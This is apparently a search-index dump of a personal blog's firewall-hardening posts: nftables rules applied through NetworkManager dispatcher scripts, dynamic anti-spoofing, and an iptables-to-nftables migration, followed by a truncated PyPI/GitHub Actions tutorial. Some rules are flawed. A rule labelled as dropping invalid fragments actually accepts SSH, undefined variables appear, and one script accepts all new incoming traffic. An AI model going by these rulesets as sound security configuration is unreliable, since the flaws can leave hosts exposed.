[ { "title": "Dynamic firewall rules with nftables and NetworkManager", "url": "/posts/dynamic-firewall-rules-nftables-network-manager/", "categories": "hardening, firewall", "tags": "hardening, firewall, iptables, nftables", "date": "2025-08-30 02:00:01 +0200", "snippet": "Dynamically implement IPv4 and IPv6 firewall rules for each network interface with nftables and NetworkManager.If the interface comes online or changes IP, the rules are automatically updated.If th...", "content": "Dynamically implement IPv4 and IPv6 firewall rules for each network interface with nftables and NetworkManager.If the interface comes online or changes IP, the rules are automatically updated.If the interface goes offline, the rules are automatically deleted.Why?I while ago I wrote about Migrate from iptables to nftables.More recently I wrote about How to prevent IP spoofing with nftables and NetworkManager.Yep, I’m into firewalling lately… :PThe thing is, as the iptables to nftables migration post is written in a single file (for simplicity and to use a server as an example), and IP spoofing (althoug is implemented dynamically) is only a part of protection, I decided to combine both, and explain how to dynamically manage firewall rules with nftables and NetworkManager.This implementation is geared toward everyday devices (desktops and/or laptops) where network interfaces may be available (or unavailable) and their IP addresses may change.Managing the firewall manually in these environments would be a horrible job, if not impossible.The strategyThe strategy, for me, in these scenarios is simple: Keep the /etc/nftables.conf file as simple as possible and, then, implement rules dynamically for the interfaces with NetworkManager.nftables.confThis file should be kept as simple as possible.To achieve this, this file will only contain: Deny all rules: We will start from a deny all by default. Rules to allow all traffic for the loopback interface (lo): This is necessary for local applications and services to communicate with each other. ICMP rules: Since this rules will be applied per protocol and (in my case) the same ones will be applied to all interfaces. If you don’t want all ICMP rules to apply to all interfaces, or you want different ICMP rules to apply to different interfaces, don’t add these rules to the /etc/nftables.conf file and add them to the interface file(s).#!/usr/sbin/nft -f#/etc/nftables.conf# Clear existing rulesflush ruleset# Using 'inet' family for rules that apply to both IPv4 and IPv6table inet filter { # Blacklisted IP addresses set blacklist_ipv4_static { type ipv4_addr; flags interval; auto-merge; elements = { 169.254.0.0/16, 192.0.2.0/24, 224.0.0.0/4, 240.0.0.0/4, 255.255.255.255, 0.0.0.0/8 }; } set blacklist_ipv4 { type ipv4_addr; flags dynamic; } set blacklist_ipv6_static { type ipv6_addr; flags interval; auto-merge; elements = { fe80::/10, 2001:db8::/32, ff00::/8, ::/128 }; } set blacklist_ipv6 { type ipv6_addr; flags dynamic; } # ICMP handling for incoming traffic (IPv4 &amp; IPv6) chain ICMP_IN { # Allow replies for established/related ICMP sessions icmp type { echo-reply, destination-unreachable, time-exceeded } ct state { related, established } accept icmpv6 type { 129, 1, 2, 3, 4 } ct state { related, established } accept # echo-reply, dest-unreachable, packet-too-big, time-exceeded, parameter-problem # Drop incoming echo-requests (ping) by default icmp type echo-request drop icmpv6 type echo-request drop } # ICMP handling for outgoing traffic (IPv4 &amp; IPv6) chain ICMP_OUT { # Allow outgoing echo-requests (ping) and established/related ICMP icmp type echo-request ct state { new, established } accept icmpv6 type echo-request ct state { new, established } accept } chain INPUT { type filter hook input priority 0; policy drop; # Default drop policy for incoming # Allow all traffic on the loopback interface (essential for local processes) iif \"lo\" accept } chain FORWARD { type filter hook forward priority 0; policy drop; } chain OUTPUT { type filter hook output priority 0; policy drop; # Default drop policy for outgoing # Allow all traffic on the loopback interface oif \"lo\" accept }}The rules for interfacesWe create the script 10-nftables-hotplug in /etc/NetworkManager/dispatcher.d/ (as root) with the following content (the script is self explainatory):At this point, we can create one file for all interfaces or one file for each interface.To maintain a single file, if I needed other rules depending on the interface, I would handle the cases through conditionals in the code of this script.I prefer to keep a single file, but this, as always, will depend on each user’s preferences and needs.#!/usr/bin/env bash# /etc/NetworkManager/dispatcher.d/10-nftables-hotplug# $1 = interface name# $2 = connection statusdelete_rules() { interface=$1 chain=$2 handles=$(sudo nft -a list chain inet filter $chain | grep \"ifname \\\"$interface\\\"\" | awk '{print $NF}') if [ -n \"$handles\" ]; then for handle in $handles; do sudo nft delete rule inet filter $chain handle $handle done fi}# Delete old rulesdelete_rules \"$1\" INPUTdelete_rules \"$1\" OUTPUTif [[ \"$1\" != lo &amp;&amp; (\"$2\" = \"up\" || \"$2\" = \"dhcp4-change\" || \"$2\" = \"dhcp6-change\") ]]; then # Add rules to the INPUT chain # 1. Anti-spofing ipv4=$(ip addr show $1 | awk '$1==\"inet\"{gsub(\"/.*\",\"\",$2); print $2; next}') if [ -n \"$ipv4\" ]; then nft add rule inet filter INPUT iifname \"$1\" ip saddr \"$ipv4\" drop fi ipv6=$(ip addr show $1 | awk '$1==\"inet6\"{gsub(\"/.*\",\"\",$2); print $2; next}') if [ -n \"$ipv6\" ]; then nft add rule inet filter INPUT iifname \"$1\" ip6 saddr \"$ipv6\" drop fi # 2. Accept established and related traffic nft add rule inet filter INPUT iifname \"$1\" ct state { established, related } accept # 3. Drop traffic from known blacklisted ips nft add rule inet filter INPUT iifname \"$1\" ip saddr @blacklist_ipv4 drop nft add rule inet filter INPUT iifname \"$1\" ip6 saddr @blacklist_ipv6 drop # 4. Drop invalid traffic nft add rule inet filter INPUT iifname \"$1\" ct state invalid drop # 5. Drop invalid fragmented packets nft add rule inet filter INPUT iifname \"$1\" ip frag-off != 0 tcp dport 22 ct state new accept # 6. Jump to an ICMP chain nft add rule inet filter INPUT iifname \"$1\" meta l4proto { icmp, icmpv6 } jump ICMP_IN # 7. Limit and drop new connections to prevent floods and scans nft add rule inet filter INPUT iifname \"$1\" tcp limit rate 5/second burst 15 packets counter add @blacklist_ipv4 { ip saddr } drop nft add rule inet filter INPUT iifname \"$1\" tcp limit rate 5/second burst 15 packets counter add @blacklist_ipv6 { ip6 saddr } drop nft add rule inet filter INPUT iifname \"$1\" udp limit rate 5/second burst 15 packets counter add @blacklist_ipv4 { ip saddr } drop nft add rule inet filter INPUT iifname \"$1\" udp limit rate 5/second burst 15 packets counter add @blacklist_ipv6 { ip6 saddr } drop # 8. Accept all incoming traffic nft add rule inet filter INPUT iifname \"$1\" ct state new accept # Add rules to the OUTPUT chain # 1. Jump to an ICMP chain nft add rule inet filter OUTPUT oifname \"$1\" meta l4proto { icmp, icmpv6 } jump ICMP_OUT # 2. Accept all outgoing traffic nft add rule inet filter OUTPUT oifname \"$1\" acceptfi Scripts placed in /etc/NetworkManager/dispatcher.d/ should be named with a number (between 00 and 99) followed by a descriptive number.The naming convention it’s XX-name.NetworkManager executes these scripts in numerical order from lowest to highest. Note that, in this example, all incoming and outgoing traffic is allowed.You should only allow traffic for your trusted services.With this script, every time an interface connects or changes IP, its old rules will be deleted, and new ones will be added, taking into account the new IP.If an interface is disconnected, its associated rules will be deleted.Enjoy! ;)" }, { "title": "How to prevent IP spoofing with nftables and NetworkManager", "url": "/posts/nftables-dynamic-anti-spoofing-networkmanager/", "categories": "hardening, firewall", "tags": "hardening, firewall, iptables, nftables, anti-spoofing, spoofing", "date": "2025-08-16 02:00:01 +0200", "snippet": "Add dynamic IP anti-spoofing rules to your nftables firewall with NetworkManager.Prevent spoofing of your computer’s network interfaces using dynamic nftables rules.Why?I while ago I wrote my artic...", "content": "Add dynamic IP anti-spoofing rules to your nftables firewall with NetworkManager.Prevent spoofing of your computer’s network interfaces using dynamic nftables rules.Why?I while ago I wrote my article Migrate from iptables to nftables, in which I explained how to migrate from iptables to nftables and why.I guess many of you have noticed that I included a static anti-spoofing rule.The computer on which I configured that firewall acts as a server, it only has that network interface and doesn’t change networks.So, configuring a static anti-spoofing rule on that computer, is very simple and very easy to mantain.But, what happens when the computer it’s a laptop (for example)?I latop typically has two network interfaces, and may frequently switch between networks.Mantaining static anti-spoofing filtering rules in this scenario would be horrible.What is IP spoofing?Spoofing is the act of faking your identity in a digital environment to impersonate a trusted source.There are many types of spoofing: email spofing, web spoofing, caller ID spoofing, IP spoofing…For brevity, In this post, I will focus only on IP spoofing.Focusing on IP spoofing of our computer interfaces using dynamc rules with nftables and NetworkManager.IP spoofing is a type of spoofing where an attacker creates IP packets with a false source IP address.This is possible because the design of the internet’s communication protocols, specifically TCP/IP, doesn’t always verify the source IP address of a packet.Why is IP spoofing dangerousIP spoofing is dangerous because it allows attackers to bypass security measures and launch powerful and stealthy attacks, for example: DDoS Attackers floods a server with an overwhelming amount of traffic.By using spoofed IP addresses, they make it nearly impossible to block the malicious traffic, since the packets may appear to come from different random IPs, trusted IPs, or, in our case, from legitimate IPs from our own machine. Bypass authentication Some systems rely on IP address authentication.If an attacker can spoof that IP, he will be able to access the “protected” resources. Masking identity By spoofing the source IP, an attacker remains anonymous thorough the attack.This makes incredibly difficult for sysadmins trace the attack back to its origin. Adding dynamic IP spoofing rules to nftables to avoid IP spoofing For this to work we need to have the “INPUT” table and the “filter” chanin created.We create the script 10-nftables-anti-spoofing in /etc/NetworkManager/dispatcher.d/ (as root) with the following content (the script is self explainatory):#!/usr/bin/env bash# $1 = interface name# $2 = connection statusdelete_rules() { local interface=\"$1\" local family=\"$2\" nft -a list ruleset | grep \"iifname \\\"$interface\\\" $family \" | while read -r line; do handle=$(echo \"$line\" | sed -n 's/.* handle \\([0-9]*\\).*/\\1/p') if [ -n \"$handle\" ]; then nft delete rule inet filter INPUT handle \"$handle\" fi done}# When an interface is connected or its configuration changedif [ \"$2\" = \"dhcp4-change\" ]; then\tipv4=$(ip addr show $1 | awk '$1==\"inet\"{gsub(\"/.*\",\"\",$2); print $2; next}')\tipv6=$(ip addr show $1 | awk '$1==\"inet6\"{gsub(\"/.*\",\"\",$2); print $2; next}') # Delete old rules \tif [ -n \"$ipv4\" ]; then \t\tdelete_rules \"$1\" \"ip\" # Delete old anti-spoofing rules for the interface and family \t nft add rule inet filter INPUT iifname \"$1\" ip saddr \"$ipv4\" drop # Add new anti-spoofing rules \tfi \tif [ -n \"$ipv6\" ]; then \t\tdelete_rules \"$1\" \"ip6\" # Delete old anti-spoofing rules for the interface and family \t nft add rule inet filter INPUT iifname \"$1\" ip6 saddr \"$ipv6\" drop # Add new anti-spoofing rules \tfifi Scripts placed in /etc/NetworkManager/dispatcher.d/ should be named with a number (between 00 and 99) followed by a descriptive number.The naming convention it’s XX-name.NetworkManager executes these scripts in numerical order from lowest to highest.We give execution permissions to the script:sudo chmod +x /etc/NetworkManager/dispatcher.d/10-nftables-anti-spoofingNow, the script will be executed automatically when we connect or disconnect a network interface or whe we change its configuration.Enjoy! ;)" }, { "title": "Migrate from iptables to nftables. Boost your Linux firewall performance", "url": "/posts/migrate-iptables-nftables/", "categories": "hardening, firewall", "tags": "hardening, firewall, iptables, nftables, network, sysadmin", "date": "2025-06-14 02:00:01 +0200", "snippet": "Learn the essential steps to migrate your Linux firewall configurations from iptables to nftables.This guide covers syntax, commands, best practices for a smooth transition and offers a good set of...", "content": "Learn the essential steps to migrate your Linux firewall configurations from iptables to nftables.This guide covers syntax, commands, best practices for a smooth transition and offers a good set of essential rules.Why?A while back, due to some changes in my home networks, I decided to harden my systems by implementing firewalls with iptables: iptables essential rules. A starting point to protect your computer.And, to this day, I’m still very happy with the results.However, as everything changes and evolves, the currently recommended firewall is nftables.So I decided to upgrade myself, my systems, and migrate the firewalls to nftables.What is nftables?nftables is developed by Netfilter, the same organization that currently maintains iptables.nftables is a subsystem of the Linux kernel that provides filtering and classification of network packets/datagrams/frames.nftables was first publicly presented at Netfilter Workshop 2008 by Patrick McHardy from the Netfilter Core Team.The first preview release of kernel and userspace implementation was given in March 2009.On 16 October 2013, Pablo Neira Ayuso submitted a nftables core pull request to the Linux kernel mainline tree.It was merged into the kernel mainline on 19 January 2014, with the release of Linux kernel version 3.13.nftables replaces the popular {ip,ip6,arp,eb}tablesreuses the existing Netfilter subsystems, and provides a new in-kernel packet classification framework based on a network-specific Virtual Machine (VM) and a new nft userspace command line tool.This VM is able to execute bytecode to inspect a network packet and make decisions about how to handle it.Why ntables instead iptables?Iptables is aging very well, but nftables is gaining ground.The Netfilter project and the community are focused in replacing iptables with nftables.And, nftables, offers us some advantages over iptables: It provides new structures that drastically reduces the number of rules needed to inspect a packet until reaching the final action. Faster packet classification. Simplified dual stack IPv4/IPv6 management (This avoids code duplication and inconsistencies). Nicer and more compact syntaxBasically, it avoids duplication of work and inconsistencies, is easier to configure and mantain and is faster.I love working less! ;)Migrate from iptables to nftablesI’m going to explain how to migrate based on some initial rules that you can see in my post iptables essential rules. A starting point to protect your computer.If you don’t have any initial rules to work from, you will have to manually create your file and you can skip the next sections and jump to Test your nftables ruleset.Backup iptables rulessudo iptables-save &gt; /home/rubenhortas/backups/iptables/iptables/iptables_rules_v4~sudo ip6tables-save &gt; /home/rubenhortas/backups/iptables/iptables_rules_v6~Install nftablessudo apt install nftablesTranslate iptables rules to nftables rulessudo iptables-restore-translate -f /home/rubenhortas/backups/iptables/iptables/iptables_rules_v4~ &gt; /home/rubenhortas/backups/nftables_rules_v4.nftsudo ip6tables-restore-translate -f /home/rubenhortas/backups/iptables/iptables_rules_v6~ &gt; /home/rubenhortas/backups/nftables_rules_v4.nftReview the rules (Coffee time! ☕)This is usually where I go to make a cup of coffee, because I spend a lot of time reviewing, sorting and commenting the generated rules ;)I do this to make a mental map of the rules and needs, and later organize them.Also, some complex iptables extensions might not translate perfectly and may require manual adjustment.There is my nftables starting point:# Set Default Policies (DROP everything first)add table ip filteradd chain ip filter INPUT { type filter hook input priority 0; policy drop; }add chain ip filter FORWARD { type filter hook forward priority 0; policy drop; }add chain ip filter OUTPUT { type filter hook output priority 0; policy drop; }# Allow all traffic on the loopback interface (the internal 127.0.0.1 address. Essential for local processes)add rule ip filter INPUT iifname \"lo\" counter acceptadd rule ip filter OUTPUT oifname \"lo\" counter accept# Blacklisting IP adresses# 168.254.0.0/16 Zeroconf address range. APIPA range.# 192.0.2.0/24 TEST-NET-1# 224.0.0.0/4 Multicast# 240.0.0.0/4 Reserved/Class E# 255.255.255.255 Broadcast# 0.0.0.0/8 Unspecified/Current Networkadd set ip filter blacklisted_ips { type ipv4_addr; flags interval; auto-merge; }add element ip filter blacklisted_ips { 169.254.0.0/16, 192.0.2.0/24, 224.0.0.0/4, 240.0.0.0/4, 255.255.255.255, 0.0.0.0/8 }add rule ip filter INPUT ip saddr @blacklisted_ips counter drop# Spoofing# Deny incoming traffic that has a source address of an IP address assigned to a local interface.# Incoming traffic with the source address of your system is going to be spoofed traffic because you know it cannot be generated by the host.# 192.168.1.100 Own ipadd rule ip filter INPUT ip saddr 192.168.1.100 counter dropadd rule ip filter OUTPUT ip saddr != 192.168.1.100 counter drop # Deny outgoing traffic that does not have a source address of an interface on the local host.# Drop packets with invalid stateadd rule ip filter INPUT ct state invalid counter drop# SSH# Allow incoming SSH connections# Deny outgoing connections is covered by the OUTPUT policy dropadd rule ip filter INPUT tcp dport 22 ct state new,established counter accept# Drop Packet fragmentsadd rule ip filter INPUT ip frag-off &amp; 0x1fff != 0 counter drop# Allow Established/Related Connectionsadd rule ip filter INPUT ct state related,established counter acceptadd rule ip filter OUTPUT ct state related,established counter accept# Bad flags (and another anomalies)add chain ip filter BAD_FLAGSadd rule ip filter INPUT ip protocol tcp counter jump BAD_FLAGSadd rule ip filter BAD_FLAGS tcp flags fin,syn / fin,syn counter dropadd rule ip filter BAD_FLAGS tcp flags syn,rst / syn,rst counter dropadd rule ip filter BAD_FLAGS tcp flags fin,syn,psh / fin,syn,psh counter dropadd rule ip filter BAD_FLAGS tcp flags fin,syn,rst / fin,syn,rst counter dropadd rule ip filter BAD_FLAGS tcp flags fin,syn,rst,psh / fin,syn,rst,psh counter dropadd rule ip filter BAD_FLAGS tcp flags fin / fin counter dropadd rule ip filter BAD_FLAGS tcp flags 0x0 / fin,syn,rst,psh,ack,urg counter dropadd rule ip filter BAD_FLAGS tcp flags fin,syn,rst,psh,ack,urg / fin,syn,rst,psh,ack,urg counter dropadd rule ip filter BAD_FLAGS tcp flags fin,psh,urg / fin,syn,rst,psh,ack,urg counter dropadd rule ip filter BAD_FLAGS tcp flags fin,syn,rst,ack,urg / fin,syn,rst,psh,ack,urg counter drop# Port scanners# Drop packages if the connections are too agressive to avoid port scanning.add rule ip filter INPUT tcp flags syn / fin,syn,rst,ack ct state new meter port_scanners { ip saddr limit rate over 5/second } counter dropadd rule ip filter INPUT ip protocol udp ct state new meter port_scanners { ip saddr limit rate over 35/second } counter drop# SYN flood protectionadd rule ip filter INPUT tcp flags syn / fin,syn,rst,ack limit rate 100/second burst 200 packets counter acceptadd set ip filter connlimit0 { type ipv4_addr; flags dynamic; }add rule ip filter INPUT tcp flags syn / fin,syn,rst,ack add @connlimit0 { ip saddr ct count over 30 } counter reject with tcp resetadd rule ip filter INPUT tcp flags syn / fin,syn,rst,ack counter drop# ICMP# All ICMP responses should be barred except responses to outgoing connections.# Allow outbound echo messages and indbound echo reply messages -&gt; Allows the use of ping from the host.# Allow time exceeded and destination unreaachable messages inbound -&gt; Allow the use of tools such traceroute.# Avoids ICMP flood, ICMP smurf, Ping of death, ICMP nuke...add chain ip filter ICMP_INadd chain ip filter ICMP_OUTadd rule ip filter INPUT ip protocol icmp counter jump ICMP_INadd rule ip filter OUTPUT ip protocol icmp counter jump ICMP_OUTadd rule ip filter ICMP_IN icmp type echo-reply ct state related,established counter acceptadd rule ip filter ICMP_IN icmp type destination-unreachable ct state related,established counter acceptadd rule ip filter ICMP_IN icmp type echo-request ct state new counter dropadd rule ip filter ICMP_IN icmp type time-exceeded ct state related,established counter acceptadd rule ip filter ICMP_OUT icmp type echo-request ct state new,established counter accept# Allow NFSadd rule ip filter INPUT tcp dport 2049 ct state new,established counter acceptadd rule ip filter OUTPUT tcp sport 2049 ct state established counter accept# IRC# add rule ip filter INPUT ip protocol tcp tcp sport 6697 ct state established counter accept# add rule ip filter OUTPUT ip protocol tcp tcp dport 6697 ct state new,established counter accept# Allow DNSadd rule ip filter INPUT ip protocol tcp tcp sport { 53, 853 } ct state established counter acceptadd rule ip filter INPUT ip protocol udp udp sport { 53, 853 } ct state established counter acceptadd rule ip filter OUTPUT ip protocol tcp tcp dport { 53, 853 } ct state new,established counter acceptadd rule ip filter OUTPUT ip protocol udp udp dport { 53, 853 } ct state new,established counter accept# Allow HTTP and HTTPSadd rule ip filter INPUT ip protocol tcp tcp dport { 80, 443 } ct state established counter acceptadd rule ip filter OUTPUT ip protocol tcp tcp dport { 80, 443 } ct state new,established counter accept# Allow NTPadd rule ip filter INPUT udp sport 123 ct state established counter acceptadd rule ip filter OUTPUT udp dport 123 ct state new,established counter accept 192.168.1.100 it’s the only IP my machine has and I’m not allowing outgoing ssh connections.Adjust according to your needs.Now, we can use these rules or we can (manually) create a nftables.conf file.Create a nftables.conf (more coffee! ☕☕)This is often preferred for a cleaner, more organized setup.You’ll define tables and chains explicitly:#!/usr/sbin/nft -f# Clear existing rulesflush ruleset# Interfacesdefine LAN_INTERFACE_IPV4 = 192.168.1.100define LAN_INTERFACE_IPV6 = dead::beef# Portsdefine SSH_PORT = 22define NFS_PORT = 2049define HTTP_PORTS = { 80, 443 }define DNS_PORTS = { 53, 853 }define NTP_PORT = 123# Using 'inet' family for rules that apply to both IPv4 and IPv6,table inet filter { # Blacklisted IP addresses set blacklist_ipv4 { type ipv4_addr; flags interval; auto-merge; elements = { 169.254.0.0/16, 192.0.2.0/24, 224.0.0.0/4, 240.0.0.0/4, 255.255.255.255, 0.0.0.0/8 } } set blacklist_ipv6 { type ipv6_addr; flags interval; auto-merge; elements = { fe80::/10, 2001:db8::/32, ff00::/8, ::/128 } } # ICMP handling for incoming traffic (IPv4 &amp; IPv6 consolidated) chain ICMP_IN { # Allow replies for established/related ICMP sessions icmp type { echo-reply, destination-unreachable, time-exceeded } ct state { related, established } counter accept icmpv6 type { 129, 1, 2, 3, 4 } ct state { related, established } counter accept # echo-reply, dest-unreachable, packet-too-big, time-exceeded, parameter-problem # Drop incoming echo-requests (ping) by default icmp type echo-request counter drop icmpv6 type echo-request counter drop } # ICMP handling for outgoing traffic (IPv4 &amp; IPv6 consolidated) chain ICMP_OUT { # Allow outgoing echo-requests (ping) and established/related ICMP icmp type echo-request ct state { new, established } counter accept icmpv6 type echo-request ct state { new, established } counter accept } chain INPUT { type filter hook input priority 0; policy drop; # Default drop policy for incoming # Optimize order for performance: # High-volume, low-risk traffic first. # Specific drops before general accepts. # 1. Allow all traffic on the loopback interface (essential for local processes) iif \"lo\" accept # 2. Allow Established/Related Connections (VERY IMPORTANT, handles most ongoing traffic) ct state { related, established } counter accept # 3. Drop packets with invalid state (e.g., malformed, out-of-sync) ct state invalid counter drop # 4. Anti-spoofing and blacklisted IPs (fast drops for known bad traffic) # IPv4 iif != \"lo\" ip saddr @blacklist_ipv4 counter drop ip saddr $LAN_INTERFACE_IPV4 counter drop # Deny incoming traffic from own IP #IPv6 ip6 saddr @blacklist_ipv6 counter drop iif != \"lo\" ip6 saddr $LAN_INTERFACE_IPV6 counter drop # 5. Drop fragmented packets that are clearly invalid or cannot be reassembled ip frag-off != 0 ct state invalid counter drop # 6. Jump to ICMP chain meta l4proto { icmp, icmpv6 } counter jump ICMP_IN # 7. Legitimate services tcp dport { $SSH_PORT, $NFS_PORT } ct state new counter accept tcp sport $DNS_PORTS ct state new counter accept udp sport { $DNS_PORTS, $NTP_PORT } ct state new counter accept # 8. Basic port scanner protection ct state new limit rate 10/second burst 20 packets drop } chain FORWARD { type filter hook forward priority 0; policy drop; } chain OUTPUT { type filter hook output priority 0; policy drop; # Default drop policy for outgoing # 1. Allow all traffic on the loopback interface oif \"lo\" accept # 2. Allow Established/Related Connections ct state { related, established } counter accept # 3. Anti-spoofing for outgoing traffic # Deny outgoing traffic that does not have the source address of the system interface oif != \"lo\" ip saddr != $LAN_INTERFACE_IPV4 counter drop oif != \"lo\" ip6 addr != $LAN_INTERFACE_IPV6 counter drop # 4. Legitimate services tcp dport { $TORRENT_SERVER_PORTS, $DNS_PORTS, $HTTP_PORTS } ct state new counter accept tcp sport $NFS_PORT ct state new counter accept udp dport { $TORRENT_SERVER_PORTS, $TRACKER_PORTS, $DNS_PORTS, $NTP_PORT } ct state new counter accept udp sport $NFS_PORT ct state new counter accept # 5. Jump to ICMP_OUT chain for ICMP/ICMPv6 traffic meta l4proto { icmp, icmpv6 } counter jump ICMP_OUT }} 192.168.1.100 it’s the only IP my machine has.Adjust IPs and interfaces according to your needs.Many of you may have noticed that I have set a static antispoofing configuration.It’s fine for this machine, since it only has a network interace and doesn’t switch networks.If you want a dynamic antisoofing configuration, you can delte the antispoofing blocks (incoming and outcoming) and read: How to prevent IP spoofing with nftables and NetworkManager.Test your nftables rulesetValidate syntaxsudo nft -c -f /home/rubenhortas/configs/nftables.confIf there’s no output, the syntax is correct.Test in coward modesudo nft -f /home/rubenhortas/configs/nftables.conf &amp;&amp; sleep 300 &amp;&amp; sudo nft flush rulesetIf anything goes wrong, the nftables rules will be flushed in 5 minutes.Verify the rules with:sudo nft list rulesetYou have 5 minutes to test your connections.You can repeat these steps as many times as you want/need ;)Flush iptables rulesI flush my iptables and ip6tables at first, to make sure there are no rules in memory:iptables -P INPUT ACCEPTiptables -P FORWARD ACCEPTiptables -P OUTPUT ACCEPTiptables -t nat -Fiptables -t mangle -Fiptables -Fiptables -Xip6tables -P INPUT ACCEPTip6tables -P FORWARD ACCEPTip6tables -P OUTPUT ACCEPTip6tables -t nat -Fip6tables -t mangle -Fip6tables -Fip6tables -XDisable and stop iptables servicesOnce we have verified that everything is working correctly, we can disable iptables services:sudo systemctl disable --now iptablessudo systemctl disable --now ip6tablessudo systemctl disable --now netfilter-persistent # If you use iptables-persistentUninstall iptables and netfilter-persistentsudo apt purge iptables netfilter-persistentDelete /etc/iptablessudo rm -rf /etc/iptablesFind more iptables files (or folders)You can also check if there are more iptables files on the system:sudo find / \\( -path /proc -o -path ./usr \\) -iname *ip?tables* 2&gt;/dev/nullCopy our nftables.conf to /etcTo make the rules persistent, we must save them to a configuration file: /etc/nftables.conf.The nftables service will start automatically on boot and load the rules from /etc/nftables.confsudo cp /home/rubenhortas/configs/nftables.conf /etc/And we change the file permissions:sudo chown root:root /etc/nftables.confEnable and start nftables servicesudo systemctl enable --now nftablesReboot and check our nftables rulesAfter reboot, we can check our nftables rules again to ensure they load correctly and are persisted.sudo nft list rulesetSources netfilter/nftables wiki.nftables Wikipedia/nftablesAs always, thanks to Rodrigo Rega for the advice :)Enjoy! ;)" }, { "title": "Upload a package to PyPI automatically with GitHub Actions", "url": "/posts/upload-package-pypi-github-actions/", "categories": "python, pypi", "tags": "programming, python, pypi, github, github actions", "date": "2024-11-02 01:00:01 +0100", "snippet": "Some time ago, I wrote the post Upload a package to PyPI, but, how everything evolves, this time I decided to evolve and take advantage of all the power of GitHub Actions.GitHub actionsGitHub actio...", "content": "Some time ago, I wrote the post Upload a package to PyPI, but, how everything evolves, this time I decided to evolve and take advantage of all the power of GitHub Actions.GitHub actionsGitHub actions allows us to automate, customize and execute development workflows right in our github repositories.With GitHub actions we can automate a lot of tasks (build, tests, deployments, code reviews, issue management…) when an event occurs in our repository.GitHub actions it’s a very powerful tool, I have to say that, for me, it has been like discovering a new world.To automate our tasks, GitHub will suggest us some workflows based on the repository type, we can create our own workflows, but we can use workflows created by other users using the Actions Marketplace and we can modfify workflows done by other users (advantages of the open source :P).In my case, I want to automate the publishing of my project fail2bangeolocation to testpypi.org and pypi.org under certain events.The first thing I though about was taking advantage of some workflow written by the community.But, after reviewing some workflows in GitHub and the Actions Marketplace, I saw that they didn’t quite fit what I wanted, and I decided to write my own workflow based on some of them.Publishing using GitHub actionsRequirements A package with the required structure To publish our python package to pypi.org, we’ll need to adhere to a specific project structure.The structure can vary a bit, but, there is a basic example of the required structure: /project├── LICENSE├── pyproject.toml├── README.md├── requirements.txt├── src│   ├── project│   │   ├── module│   │   │   └──...│   │   └──...│   └──...└── tests   └──... testpypi.org and pypi.org accounts Having a testpypi.org it’s optional, but it’s recomended.Uploading the package first to testpypi.org, we can check if there are problems, and we can check how the upload went before going into production (publishing in pypi.org). Configuring trusted publishingTrusted publishing exchanges short-lived tokens (using OpenID Connect (OIDC)) between a trusted third-party service (in our case GitHub) and testpypi.org and/or pypi.org.Trusted publishing method can be used in automated environments and eliminates the need to use manually generated API tokens to authenticate with testpypi.org and/or pypi.org when publishing.The steps to crete a [pending] publisher in testpypi.org and pypi.org, are basically the same. I had the project upload to testpypi.org and pypi.org, but If you don’t have your project uploaded yet, you can create a “pending” trusted publisher.Configuring trusted publishing in testpypiWe go to our testpypi.org account, we go to “Your projects” and we select our project (in my case fail2bangeolocation), and we click in “Manage”:testpypi manage your projectWe go to “Publishing”:testpypi publishingUnder “Trusted Publisher Management” we add a new publisher:testpypi new publisherHere we will set the owner, the repository name, the workflow name and the environment name: Owner: Our github user. Repository name: Our github repository name. Workflow name: The file name of our (future) workflow, here I will use “publish.yml”. Enviromnment name: The name of the GitHub Actions environment that the workflow will use, here I will use “testpypi”. We have to pay attention to the workflow and environment names.We will need them later.Click on “Add” and we are done! ;) It should be noted that, many times, we will not be able to install the package generated in testpypi in on our machine (or it may not work) due to dependency problems.This is because the same packages (or the same versions) may not be available in testpypi as in pypi.Configuring trusted publishing in pypi:We go to our pypi.org account, we go to “Your projects” and we select our project (in my case fail2bangeolocation), and we click in “Manage”:pypi manage your projectWe go to “Publishing”:pypi publishingUnder “Trusted Publisher Management” we add a new publisher:pypi new publisherHere we will set the owner, the repository name, the workflow name and the environment name: Owner: Our github user. Repository name: Our github repository name. Workflow name: The file name of our (future) workflow, here I will use “publish.yml”. Enviromnment name: The name of the GitHub Actions environment that the workflow will use, here I will use “pypi”. We have to pay attention to the workflow and environment names.We will need them later.Click on “Add” and we are done! ;)Adding the workflow The worflow file name has to match the name we gave it when we created the trusted trusted-publishersGitHub CI/CD workflows are declared in YAML files stored in the .github/workflows/ directory of our repositories.So, we can create a .github/workflows/publish.yml file, or, we can create it from the GitHub web interface.To create the action from the GitHub web interface, we go to our repository and select “Actions”:GitHub actionsNow, we will see some suggested actions for our repository, but, this time, we will create our own clicking in “set up a workflow yourself”:Get started with GitHub Actions - Set up a workflow yourselfIn the editor, we have to create a workflow with a file name that matches the name we gave it when we created the trusted-publishers:New workflowWe write (or paste) our workflow, we commit the changes and we are ready to publish!The workflow The environment names have to match with the enviroment names we gave them wen we created the trusted-publishers.You can see my workflow here: fail2bangeolocation publish.yml, but I’m going to copy it and explain it (briefly) here below:name: Publish Python distribution 🐍📦# The workflow is triggered when events taht include that includes tagas starting with v*.*.* or test_v*.*.*. are sent to the repository.on: push: tags: - 'v*.*.*' - 'test_v*.*.*'jobs:# Builds the pythond distribution (wheel and source tarball) build: name: Build distribution 📦 runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 # Checkout the code - name: Set up Python uses: actions/setup-python@v5 # Set up the Python environment with: python-version: \"3.x\" - name: Install pypa/build # Install the build tool run: &gt;- python3 -m pip install build --user - name: Build a binary wheel and a source tarball run: python3 -m build # Build the package - name: Store the distribution packages # Temporarily store the build artifacts in the dist directory under the name python-package-distributions uses: actions/upload-artifact@v4 with: name: python-package-distributions path: dist/# Publishes the built package to TestPyPI (for testing) if the tag starts with test_v.* publish-to-testpypi: name: Publish to TestPyPI 🐍📦 needs: - build # Start the job only if the build job has completed runs-on: ubuntu-latest environment: name: testpypi # Enter the environment name set in the Publisher url: https://test.pypi.org/p/example-package-hanaosan0318 # Project URL permissions: id-token: write # Grant Publishing permissions if: startsWith(github.ref, 'refs/tags/test_v') # Conditional check for TestPyPI publishing steps: - name: Download all the dists # Download the build artifacts that were saved earlier uses: actions/download-artifact@v4 with: name: python-package-distributions path: dist/ - name: Publish distribution 📦 to TestPyPI # Publish to TestPyPI uses: pypa/gh-action-pypi-publish@release/v1 with: repository-url: https://test.pypi.org/legacy/Publishes the built package to PyPI (production) if the tag starts with v.* publish-to-pypi: name: Publish to PyPI 🐍 📦 needs: - build # Start the job only if the build job has completed runs-on: ubuntu-latest environment: name: pypi # Enter the environment name set in the Publisher url: 